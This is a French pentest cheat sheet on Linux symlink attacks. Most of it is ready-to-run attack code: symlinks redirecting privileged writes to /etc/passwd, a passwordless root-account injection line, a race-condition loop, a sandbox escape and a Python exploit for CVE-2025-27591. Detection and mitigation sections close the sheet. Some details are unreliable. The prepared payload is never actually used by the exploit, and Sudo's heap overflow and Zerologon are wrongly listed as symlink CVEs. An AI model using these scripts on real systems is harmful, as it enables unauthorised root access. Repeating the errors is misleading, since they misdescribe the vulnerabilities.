---
title: Symlink Attack
date: "2025-01-15"
draft: false
---

# ðŸ”— Symlink Attack - Cheat Sheet

## ðŸŽ¯ Vue d'ensemble
Les **attaques par symlink (liens symboliques)** exploitent le mÃ©canisme de redirection des liens symboliques pour :
- **Escalade de privilÃ¨ges** : Ã‰crire dans des fichiers protÃ©gÃ©s
- **Bypass de restrictions** : Contourner les contrÃ´les d'accÃ¨s
- **Race conditions** : Exploiter des fenÃªtres temporelles

---

## ðŸ” Qu'est-ce qu'un Symlink ?

### DÃ©finition
Un **symlink** est un fichier spÃ©cial qui pointe vers un autre fichier ou rÃ©pertoire. Quand un programme interagit avec le symlink, il interagit avec la cible.

```bash
# CrÃ©ation d'un symlink
ln -s /chemin/vers/cible /chemin/vers/symlink

# VÃ©rification
ls -la /chemin/vers/symlink
# lrwxrwxrwx 1 user user 11 date symlink -> /chemin/vers/cible

# Lecture via symlink
cat /chemin/vers/symlink  # Lit le contenu de la cible !
```

### Types de liens
```bash
# Lien symbolique (symlink)
# Pourquoi : Pointe vers un chemin, peut traverser les systÃ¨mes de fichiers
ln -s /target/file /link/to/file

# Lien dur (hard link)
# Pourquoi : Pointe vers l'inode, mÃªme systÃ¨me de fichiers uniquement
ln /target/file /link/to/file
```

---

## âš¡ Techniques d'Attaque

### 1. Symlink vers fichier privilÃ©giÃ©

#### ScÃ©nario
Un service privilÃ©giÃ© Ã©crit dans un fichier sous notre contrÃ´le.

```bash
# 1. Identifier le fichier cible
# Pourquoi : Trouver oÃ¹ le service Ã©crit ses donnÃ©es
ls -la /var/log/service/
ls -la /tmp/service/

# 2. VÃ©rifier les permissions du rÃ©pertoire
# Pourquoi : On doit pouvoir crÃ©er/modifier des fichiers
ls -la /path/to/service/logs/
# drwxrwxrwx = world-writable â†’ VulnÃ©rable !

# 3. Remplacer le fichier par un symlink
rm /path/to/service/logfile
ln -s /etc/passwd /path/to/service/logfile

# 4. DÃ©clencher l'Ã©criture du service
systemctl restart service
# ou dÃ©clencher une erreur pour forcer l'Ã©criture
```

#### Payload d'injection
```bash
# Injection dans /etc/passwd
echo "attacker::0:0:,,,:/root:/bin/bash" > /tmp/payload

# Ou injection dans /etc/shadow (si possible)
echo "attacker:\$6\$salt\$hash:18000:0:99999:7:::" > /tmp/payload
```

### 2. Exploitation CVE-2025-27591 (Below)

#### Contexte
Le service "Below" Ã©crit ses logs avec des privilÃ¨ges root dans un rÃ©pertoire world-writable.

```bash
# 1. VÃ©rification de la vulnÃ©rabilitÃ©
# Pourquoi : Confirmer que le rÃ©pertoire est modifiable
ls -la /var/log/below/
# drwxrwxrwx 3 root root 4096 below/  â† VulnÃ©rable !

# 2. Identification du fichier cible
# Pourquoi : Trouver le fichier de log utilisÃ© par le service
ls -la /var/log/below/
# error_root.log â† Fichier d'Ã©criture du service root

# 3. CrÃ©ation du symlink malveillant
rm /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log

# 4. PrÃ©paration du payload
echo "attacker::0:0:,,,:/root:/bin/bash" > /tmp/attacker

# 5. DÃ©clenchement de l'exploit
sudo below record  # Force l'Ã©criture dans le log
```

### 3. Race Condition avec Symlink

#### Technique
Exploiter une fenÃªtre temporelle entre vÃ©rification et utilisation.

```bash
# Script d'exploitation de race condition
#!/bin/bash
# Pourquoi : Automatiser l'exploitation de la race condition

while true; do
    # CrÃ©er un fichier lÃ©gitime
    echo "content" > /tmp/racefile
    
    # Rapidement le remplacer par un symlink
    rm /tmp/racefile 2>/dev/null
    ln -s /etc/passwd /tmp/racefile 2>/dev/null
    
    sleep 0.1
done
```

### 4. Bypass de Sandbox

#### Technique
Utiliser des symlinks pour sortir d'un environnement restreint.

```bash
# 1. Depuis un rÃ©pertoire restreint
# Pourquoi : AccÃ©der Ã  des fichiers en dehors de la sandbox
pwd
# /restricted/path

# 2. CrÃ©er un symlink vers l'extÃ©rieur
ln -s ../../../../etc/passwd escape

# 3. AccÃ©der au fichier
cat escape  # Lit /etc/passwd depuis la sandbox !
```

---

## ðŸ›¡ï¸ DÃ©tection et Ã‰numÃ©ration

### Recherche de vulnÃ©rabilitÃ©s

```bash
# 1. RÃ©pertoires world-writable
# Pourquoi : Identifier oÃ¹ on peut crÃ©er des symlinks
find / -type d -perm -0002 -ls 2>/dev/null
find / -type d -perm -0777 -ls 2>/dev/null

# 2. Services qui Ã©crivent dans des rÃ©pertoires modifiables
# Pourquoi : Trouver les vecteurs d'exploitation
ps aux | grep root
lsof | grep -E "(tmp|log)" | grep root

# 3. Fichiers temporaires des services
# Pourquoi : Identifier les fichiers temporaires exploitables
ls -la /tmp/ /var/tmp/ /dev/shm/
find /var/log -type f -perm -0002 2>/dev/null
```

### Outils d'audit

```bash
# LinPEAS - Recherche automatisÃ©e
./linpeas.sh | grep -i "writable\|symlink"

# Recherche de symlinks existants
find / -type l -ls 2>/dev/null | head -20

# Surveillance en temps rÃ©el
# Pourquoi : Observer les crÃ©ations de fichiers par les services
inotifywait -m -r /var/log/ /tmp/ --format '%w%f %e'
```

---

## ðŸŽ¯ Cas d'Usage RÃ©els

### CVE-2025-27591 - Below Monitoring Tool

**Contexte :** Service de monitoring "Below" avec rÃ©pertoire world-writable.

```python
#!/usr/bin/env python3
# Exploit automatisÃ© pour CVE-2025-27591

import os
import subprocess
import time

def exploit_below():
    log_dir = "/var/log/below"
    target_log = f"{log_dir}/error_root.log"
    
    # 1. VÃ©rifier les permissions
    if not os.access(log_dir, os.W_OK):
        print("[-] RÃ©pertoire non writable")
        return False
    
    # 2. Supprimer le fichier lÃ©gitime
    if os.path.exists(target_log):
        os.remove(target_log)
    
    # 3. CrÃ©er le symlink malveillant
    os.symlink("/etc/passwd", target_log)
    print(f"[+] Symlink crÃ©Ã©: {target_log} -> /etc/passwd")
    
    # 4. PrÃ©parer le payload
    with open("/tmp/attacker", "w") as f:
        f.write("attacker::0:0:,,,:/root:/bin/bash\n")
    
    # 5. DÃ©clencher l'Ã©criture
    subprocess.run(["sudo", "below", "record"], timeout=10)
    
    # 6. VÃ©rifier l'injection
    with open("/etc/passwd", "r") as f:
        if "attacker" in f.read():
            print("[+] Payload injectÃ© avec succÃ¨s !")
            return True
    
    return False

if __name__ == "__main__":
    exploit_below()
```

### Exploitation de logrotate

**Contexte :** Exploitation du mÃ©canisme de rotation des logs.

```bash
# 1. Identifier la configuration logrotate vulnÃ©rable
cat /etc/logrotate.d/vulnerable-service
# /var/log/service/*.log {
#     create 644 root root
# }

# 2. CrÃ©er le symlink avant la rotation
ln -s /etc/passwd /var/log/service/malicious.log

# 3. Attendre la rotation (ou la forcer)
logrotate -f /etc/logrotate.d/vulnerable-service
```

---

## ðŸ›¡ï¸ DÃ©fenses et Mitigations

### PrÃ©vention cÃ´tÃ© systÃ¨me

```bash
# 1. Restrictions de permissions
# Pourquoi : EmpÃªcher la crÃ©ation de symlinks malveillants
chmod 755 /var/log/service/  # Retirer le write pour "others"

# 2. Utilisation de rÃ©pertoires dÃ©diÃ©s
# Pourquoi : Isoler les Ã©critures des services
mkdir -p /var/log/service/private
chown service:service /var/log/service/private
chmod 700 /var/log/service/private
```

### Bonnes pratiques de dÃ©veloppement

```bash
# 1. VÃ©rification avant Ã©criture
# Pourquoi : S'assurer que le fichier n'est pas un symlink
if [ -L "/path/to/file" ]; then
    echo "Symlink dÃ©tectÃ©, arrÃªt"
    exit 1
fi

# 2. Ouverture sÃ©curisÃ©e (C/C++)
// Utiliser O_NOFOLLOW pour Ã©viter de suivre les symlinks
int fd = open("/path/to/file", O_WRONLY | O_CREAT | O_NOFOLLOW, 0644);
```

### Surveillance et dÃ©tection

```bash
# 1. Monitoring des crÃ©ations de symlinks
auditctl -w /var/log -p wa -k symlink_watch
auditctl -w /tmp -p wa -k symlink_watch

# 2. DÃ©tection automatisÃ©e
#!/bin/bash
# Script de surveillance
inotifywait -m /var/log/ --format '%w%f %e' | while read file event; do
    if [ "$event" = "CREATE" ] && [ -L "$file" ]; then
        echo "ALERT: Symlink crÃ©Ã©: $file"
        ls -la "$file"
    fi
done
```

---

## ðŸ“š Ressources et RÃ©fÃ©rences

### CVEs liÃ©es aux symlinks
- **CVE-2025-27591** : Below monitoring tool symlink attack
- **CVE-2021-3156** : Sudo heap overflow via symlink
- **CVE-2020-1472** : Zerologon (exploitation indirecte)

### Outils utiles
```bash
# Recherche de vulnÃ©rabilitÃ©s symlink
symlinks -r /  # VÃ©rifier tous les symlinks
find / -type l -exec ls -la {} \;

# Tests de sÃ©curitÃ©
./pspy64  # Observer les processus en temps rÃ©el
./LinEnum.sh  # Ã‰numÃ©ration automatisÃ©e
```

### Lectures recommandÃ©es
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Linux Privilege Escalation via Symlinks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#symlinks)
- [Race Condition Exploitation](https://www.exploit-db.com/papers/13234)

---

*Les attaques par symlink dÃ©montrent l'importance de la validation rigoureuse des chemins de fichiers et de la gestion sÃ©curisÃ©e des permissions dans les systÃ¨mes Unix/Linux.*
